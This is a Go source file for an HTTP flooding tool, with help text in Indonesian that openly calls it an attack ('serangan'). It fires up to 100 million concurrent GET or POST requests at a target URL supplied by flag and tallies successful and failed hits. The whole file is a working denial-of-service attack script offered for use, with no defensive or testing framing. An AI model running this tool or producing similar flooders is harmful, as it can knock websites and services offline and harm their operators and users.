package main

import (
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"sync"
	"time"
)

var wg sync.WaitGroup
var mu sync.Mutex
var completeCount = 0
var errorCount = 0

func main() {
	attackURL := flag.String("url", "", "URL target untuk serangan")
	method := flag.String("method", "GET", "metode serangan (POST/GET)")
	count := flag.Int("count", 100000000, "jumlah serangan")
	dataStr := flag.String("data", "", "data serangan")
	flag.Parse()

	if *attackURL == "" {
		fmt.Println("Gunakan -url http://target.com")
		return
	}

	data := getData(*method, *dataStr)

	rand.Seed(time.Now().UnixNano())
	for i := 0; i < *count; i++ {
		wg.Add(1)
		go startAttack(*attackURL, *method, data)
		time.Sleep(time.Duration(rand.Intn(20)) * time.Millisecond)
	}

	wg.Wait()

	fmt.Printf("Serangan selesai. Jumlah sukses: %d, Jumlah gagal: %d\n", completeCount, errorCount)
}

func startAttack(attackURL string, method string, data url.Values) {
	defer wg.Done()

	client := &http.Client{
		Timeout: time.Second * 10,
	}

	req, err := http.NewRequest(method, attackURL, bytes.NewBufferString(data.Encode()))
	if err != nil {
		mu.Lock()
		errorCount++
		mu.Unlock()
		return
	}

	if method == "POST" || method == "post" {
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	resp, err := client.Do(req)
	if err != nil || resp == nil {
		mu.Lock()
		errorCount++
		mu.Unlock()
		return
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil || resp.StatusCode != http.StatusOK {
		mu.Lock()
		errorCount++
		mu.Unlock()
		return
	}

	mu.Lock()
	completeCount++
	mu.Unlock()
}

func getData(method string, data string) url.Values {
	if method == "POST" || method == "post" {
		var m map[string]interface{}
		if err := json.Unmarshal([]byte(data), &m); err != nil {
			return nil
		}

		vals := url.Values{}
		for k, v := range m {
			vals.Add(k, fmt.Sprintf("%v", v))
		}
		return vals
	}
	return nil
}